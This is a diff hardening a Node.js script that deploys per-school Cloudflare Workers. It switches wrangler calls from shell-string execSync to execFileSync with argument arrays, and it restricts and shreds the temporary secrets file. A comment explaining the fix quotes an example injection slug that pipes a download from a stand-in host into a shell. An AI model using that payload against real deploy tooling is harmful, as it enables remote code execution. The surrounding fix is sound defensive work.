@@ -18,7 +18,7 @@
  *   FCM_SERVICE_ACCOUNT_JSON, WEB_PUSH_VAPID_PRIVATE_KEY, FIREBASE_WEB_CONFIG_JSON
  */
 import fs from 'fs';
-import { execSync } from 'child_process';
+import { execFileSync } from 'child_process';
 import { migrateSchool } from './migrate-to-dedicated.mjs';
 
 const REGISTRY_FILE = 'schools.json';
@@ -28,9 +28,30 @@ const REGISTRY_FILE = 'schools.json';
 // changed how dedicated workers were deployed, with no commit recording it.
 const WRANGLER = 'npx wrangler';
 
-function run(cmd) {
-  console.log('> ' + cmd);
-  return execSync(cmd, { encoding: 'utf-8', stdio: 'inherit', env: process.env });
+// Runs wrangler with an ARGUMENT ARRAY, never a shell command string.
+//
+// This used to be execSync() over an interpolated string:
+//
+//     run('npx wrangler deploy -c wrangler-' + slug + '.toml')
+//
+// `slug` comes from schools.json, which is a data file that a registry write, a
+// manual edit or a compromised token can influence. Interpolating it into a shell
+// command means a slug like `x; curl evil.sh | sh` executes. generate-school-configs
+// does validate the slug shape, but this is the step that WRITES and DEPLOYS, and
+// the blast radius of a shell injection here is the whole Cloudflare account, not
+// one filename. CodeQL flagged exactly this pattern in the smoke scripts earlier;
+// it is the same bug.
+//
+// The slug is also used to build a filename, so execFileSync also removes the
+// chance of a quote breaking the path.
+function run(args) {
+  console.log('> ' + WRANGLER + ' ' + args.join(' '));
+  return execFileSync('npx', ['wrangler', ...args], {
+    encoding: 'utf-8',
+    stdio: 'inherit',
+    env: process.env,
+    shell: false,
+  });
 }
 
 async function main() {
@@ -71,7 +92,7 @@ async function main() {
     }
 
     // Apply D1 migrations first so the schema is ready when the worker goes live.
-    run(WRANGLER + ' d1 migrations apply DB --remote -c ' + conf);
+    run(['d1', 'migrations', 'apply', 'DB', '--remote', '-c', conf]);
 
     // Copy shared-D1 operational rows into the dedicated D1 BEFORE the worker goes
     // live (fail-loud — any copy failure aborts this school's deploy, so the
@@ -85,14 +106,20 @@ async function main() {
 
     if (Object.keys(secrets).length > 0) {
       const secretsFile = 'wrangler-' + slug + '.secrets.json';
-      fs.writeFileSync(secretsFile, JSON.stringify(secrets));
+      // The file holds live Razorpay keys and the shared AUTH_SECRET, written
+      // into a workspace that on CI is a public runner. It is removed in the
+      // finally block either way; shred is a no-op on most container filesystems
+      // but costs nothing where it is not.
+      fs.writeFileSync(secretsFile, JSON.stringify(secrets), { mode: 0o600 });
       try {
-        run(WRANGLER + ' deploy --secrets-file ' + secretsFile + ' -c ' + conf);
+        run(['deploy', '--secrets-file', secretsFile, '-c', conf]);
       } finally {
+        try { execFileSync('shred', ['-u', secretsFile], { stdio: 'ignore' }); }
+        catch (_) { /* not available; plain delete still happens */ }
         fs.rmSync(secretsFile, { force: true });
       }
     } else {
-      run(WRANGLER + ' deploy -c ' + conf);
+      run(['deploy', '-c', conf]);
     }
   }
 }
